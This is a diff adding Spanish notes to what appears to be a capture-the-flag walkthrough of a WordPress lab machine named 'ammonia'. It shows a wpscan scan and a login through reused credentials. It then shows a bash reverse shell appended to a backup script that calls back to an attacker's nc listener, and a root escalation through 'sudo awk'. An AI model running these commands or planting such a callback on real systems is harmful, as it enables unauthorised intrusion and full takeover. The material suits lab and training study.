@@ -1,3 +1,5 @@
+ESCANEO 
+
 wpscan --url http://192.168.1.103:7664 -e ap --plugins-detection aggressive
 ```bash
 _______________________________________________________________
@@ -243,4 +245,25 @@ if ( ! defined( 'ABSPATH' ) ) {
 /** Sets up WordPress vars and included files. */
 require_once ABSPATH . 'wp-settings.php';
 ```
+
+ENTRAR A haber_fritz@ammonia POR QUE TIENE LAS MISMAS CREDENCIALES 
+
+
+ENTRAR A clara_immerwahr@ammonia USANDO UNA MALA CONFIGURACIÓN 
+
+nc -lvnp 9001 en kali
+haber_fritz@ammonia:~$ echo "bash -i >& /dev/tcp/192.168.1.104/9001 0>&1" >> /opt/scripts/backup_notes.sh
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [192.168.1.104] from (UNKNOWN) [192.168.1.103] 49488
+bash: cannot set terminal process group (1938): Inappropriate ioctl for device
+bash: no job control in this shell
+
+HACERSE ROOT 
+clara_immerwahr@ammonia:~$ sudo awk 'BEGIN {system("/bin/sh")}'
+sudo awk 'BEGIN {system("/bin/sh")}'
+whoami
+root
 
